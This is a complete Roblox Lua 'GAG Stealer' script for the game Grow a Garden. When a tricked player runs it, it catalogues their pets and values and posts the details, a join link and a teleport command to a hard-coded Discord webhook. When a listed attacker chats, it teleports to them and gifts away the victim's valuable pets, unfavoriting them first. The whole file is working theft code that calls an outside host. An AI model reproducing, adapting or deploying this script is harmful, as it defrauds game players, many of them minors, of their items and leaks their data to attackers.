

-- USER SETTINGS
_G.Usernames = {"saikigrow", "", "Wanwood42093"}
_G.min_value = 100000000
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTsn5HU_GebQsbnECumyVbr8E_SJLxZNbQmqqTOOMFJWYA-9BJi_LFu_45"

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack", 10)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules", 10)
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 10))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities", 10))
local petRegistry = require(replicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
local numberUtil = require(modules:WaitForChild("NumberUtil", 10))
local dataService = require(modules:WaitForChild("DataService", 10))
local character = plr.Character or plr.CharacterAdded:Wait()

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local totalValue = 0
local itemsToSend = {}

-- Define rare pets list
local rarePets = {
["Red Fox"] = true,
["Raccoon"] = true,
["Dragonfly"] = true,
["Disco Bee"] = true,
["Queen Bee"] = true,
["T-Rex"] = true,
["Fennec Fox"] = true
}

-- Define pet emoji mapping
local petEmojis = {
["Orangutan"] = "🦧",
["Hamster"] = "🐹",
["Tarantula Hawk"] = "🕷️",
["Sea Turtle"] = "🐢",
["Honey Bee"] = "🍯🐝",
["Crab"] = "🦀",
["Wasp"] = "🐝",
["Bee"] = "🐝",
["Toucan"] = "🦜",
["Caterpillar"] = "🐛",
["Pack Bee"] = "📦🐝",
["Seal"] = "🦭",
["Scarlet Macaw"] = "🦜",
["Snail"] = "🐌",
["Cow"] = "🐄",
["Sea Otter"] = "🦦",
["Peacock"] = "🦚",
["Moon Cat"] = "🐈‍⬛",
["Silver Monkey"] = "🐒",
["Dragonfly"] = "🐉",
["T-Rex"] = "🦖",
["Disco Bee"] = "🐝",
["Pterodactyl"] = "🦅",
["Raccoon"] = "🦝",
["Mimic Octopus"] = "🐙",
["Fennec Fox"] = "🦊",
["Hyacinth Macaw"] = "🦜",
["Bear"] = "🐻",
["Petal Bee"] = "🌸🐝",
["Red Giant Ant"] = "🐜",
["Giant Ant"] = "🐜",
["Mole"] = "🦦",
["Meerkat"] = "🐾",
["Flamingo"] = "🦩",
["Butterfly"] = "🦋",
["Capybara"] = "🦫",
["Queen Bee"] = "👑🐝",
["Praying Mantis"] = "🪲",
["Brontosaurus"] = "🦖",
["Moth"] = "🦋",
["Bald Eagle"] = "🦅",
["Chicken Zombie"] = "🐔💀",
["Squirrel"] = "🐿️",
["Frog"] = "🐸",
["Blood Kiwi"] = "🥝🩸",
["Monkey"] = "🐒",
["Axolotl"] = "🦎",
["Cooked Owl"] = "🦉",
["Snake"] = "🐍",
["Raptor"] = "🦖",
["Pig"] = "🐖",
["Grey Mouse"] = "🐭",
["Seagull"] = "🐦",
["Blood Hedgehog"] = "🦔🩸",
["Panda"] = "🐼",
["Turtle"] = "🐢",
["Golden Lab"] = "🐕",
["Stegosaurus"] = "🦖",
["Hedgehog"] = "🦔"
}

if next(users) == nil or webhook == "" then
plr:Kick("You didn't add any usernames or webhook")
return
end

if game.PlaceId ~= 126884695634066 then
plr:Kick("Game not supported. Please join a normal GAG server")
return
end

local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
if getServerType and getServerType:IsA("RemoteFunction") then
local ok, serverType = pcall(function()
return getServerType:InvokeServer()
end)
if ok and serverType == "VIPServer" then
plr:Kick("Server error. Please join a DIFFERENT server")
return
end
end

local function calcPetValue(v14)
if not v14 or not v14.PetData then return 0 end
local hatchedFrom = v14.PetData.HatchedFrom
if not hatchedFrom or hatchedFrom == "" then return 0 end
local eggData = petRegistry.PetEggs and petRegistry.PetEggs[hatchedFrom]
if not eggData then return 0 end
local rarityEntry = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]
if not rarityEntry or not rarityEntry.GeneratedPetData then return 0 end
local weightRange = rarityEntry.GeneratedPetData.WeightRange
if not weightRange then return 0 end
local weightFactor = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
local rarityValue = math.lerp(0.8, 1.2, weightFactor)
local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
local multiplier = rarityValue * math.lerp(0.15, 6, levelProgress)
local sellPrice = petRegistry.PetList and petRegistry.PetList[v14.PetType] and petRegistry.PetList[v14.PetType].SellPrice or 0
return math.floor(sellPrice * multiplier)
end

local function formatNumber(number)
if not number then return "0" end
local suffixes = {"", "k", "m", "b", "t"}
local i = 1
while number >= 1000 and i < #suffixes do
number = number / 1000
i = i + 1
end
if i == 1 then
return tostring(math.floor(number))
else
if number == math.floor(number) then
return string.format("%d%s", number, suffixes[i])
else
return string.format("%.2f%s", number, suffixes[i])
end
end
end

local function getHighestKGFruit()
local highest = 0
for _, item in ipairs(itemsToSend) do
if item.Weight and item.Weight > highest then
highest = item.Weight
end
end
return highest
end

local function safeString(val, default)
if val == nil then return default end
return tostring(val)
end

local function hasRarePet(list)
for _, item in ipairs(list) do
if item.Type == "Pet" and rarePets[item.Name] then
return true
end
end
return false
end

local function getDisplayName(name)
local emoji = petEmojis[name]
if emoji then
return emoji .. " " .. name
end
return name
end

local function SendJoinMessage(list, prefix)
local highestKG = getHighestKGFruit() or 0
local itemList = ""

for _, item in ipairs(list) do  
    itemList = itemList .. string.format("• **%s** (%.2f KG) — ¢%s\n",  
        safeString(getDisplayName(item.Name), "Unknown"),  
        item.Weight or 0,  
        formatNumber(item.Value or 0)  
    )  
end  

if #itemList > 1024 then  
    local lines, total = {}, 0  
    for line in itemList:gmatch("[^\r\n]+") do  
        if total + #line + 1 < 1000 then  
            table.insert(lines, line)  
            total = total + #line + 1  
        else  
            break  
        end  
    end  
    itemList = table.concat(lines, "\n") .. "\n*...and more*"  
end  

local allPetsData = dataService:GetData().PetsData.PetInventory.Data  
local totalPetsCount = 0  
if allPetsData then  
    for _ in pairs(allPetsData) do  
        totalPetsCount = totalPetsCount + 1  
    end  
end  

local allBackpackItems = {}  
for _, tool in ipairs(backpack:GetChildren()) do  
    if tool:IsA("Tool") then  
        table.insert(allBackpackItems, safeString(tool.Name, "Unknown"))  
    end  
end  
local backpackList = #allBackpackItems > 0 and "• " .. table.concat(allBackpackItems, "\n• ") or "*No items in backpack*"  

local data = {  
    ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",  
    ["embeds"] = {{  
        ["title"] = "💰 New Player Joined",  
        ["description"] = "A new target has joined the server.",  
        ["color"] = 0x00ff66,  
        ["fields"] = {  
            { name = "👤 Username", value = plr.Name, inline = true },  
            { name = "🔗 Join Link", value = ("[Click here to join](https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=%s)"):format(game.JobId), inline = true },  
            { name = "📦 Items Found", value = (#itemList > 0 and itemList) or "*No items detected*", inline = false },  
            { name = "🐾 Total Pets", value = tostring(totalPetsCount), inline = true },  
            { name = "🎒 Full Backpack Contents", value = backpackList, inline = false },  
            { name = "📊 Summary", value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG), inline = false }  
        },  
        ["footer"] = { ["text"] = "🕵️‍♂️ GAG Stealer • discord.gg/GY2RVSEGDT" },  
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
    }}  
}  

local body = HttpService:JSONEncode(data)  
local headers = {["Content-Type"] = "application/json"}  
request({Url = webhook, Method = "POST", Headers = headers, Body = body})

end

local function stealDeployedPets(player)
if not player or not player.Character then return end
local victimFarm = workspace:FindFirstChild("Gardens") and workspace.Gardens:FindFirstChild(player.Name)
or workspace:FindFirstChild("Farms") and workspace.Farms:FindFirstChild(player.Name)
or nil

if not victimFarm then  
    warn("No farm/garden found for "..player.Name)  
    return  
end  

for _, obj in ipairs(victimFarm:GetDescendants()) do  
    if obj:IsA("ProximityPrompt") and (obj.Name:lower():find("pickup") or obj.ActionText:lower():find("pickup")) then  
        local parentModel = obj.Parent  
        if parentModel and parentModel:FindFirstChildWhichIsA("Humanoid") == nil then  
            character:PivotTo(parentModel:GetPivot())  
            task.wait(0.1)  
            if obj.Enabled then  
                fireproximityprompt(obj)  
                task.wait(0.1)  
            end  
        end  
    end  
end

end

local foundRare = false

for _, tool in ipairs(backpack:GetChildren()) do
if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
if tool:GetAttribute("ItemType") == "Pet" then
local petUUID = tool:GetAttribute("PET_UUID")
local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
local itemName = v14 and v14.PetType or tool.Name
if rarePets[itemName] then
foundRare = true
end
if tool:GetAttribute("Favorite") then
replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
end
local value = calcPetValue(v14)
local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or 0
totalValue = totalValue + value
table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", IsRare = rarePets[itemName]})
end
end
end

if #itemsToSend > 0 then
table.sort(itemsToSend, function(a, b)
if a.IsRare and not b.IsRare then
return true
elseif not a.IsRare and b.IsRare then
return false
else
return a.Value > b.Value
end
end)

local prefix = ""  
if ping == "Yes" and hasRarePet(itemsToSend) then  
    prefix = "@everyone "  
end  

SendJoinMessage(itemsToSend, prefix)  

local function doSteal(player)  
    character:WaitForChild("HumanoidRootPart").CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)  
    task.wait(2)  
    stealDeployedPets(player)  
    for _, item in ipairs(itemsToSend) do  
        item.Tool.Parent = character  
        local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")  
        repeat  
            task.wait(0.01)  
        until promptHead.Enabled  
        fireproximityprompt(promptHead)  
        task.wait(0.1)  
        item.Tool.Parent = backpack  
        task.wait(0.1)  
    end  
end  

local function waitForUserChat()  
    local sentMessage = false  
    local function onPlayerChat(player)  
        if table.find(users, player.Name) then  
            player.Chatted:Connect(function()  
                if not sentMessage then  
                    sentMessage = true  
                    doSteal(player)  
                end  
            end)  
        end  
    end  
    for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end  
    Players.PlayerAdded:Connect(onPlayerChat)  
end  

waitForUserChat()

end

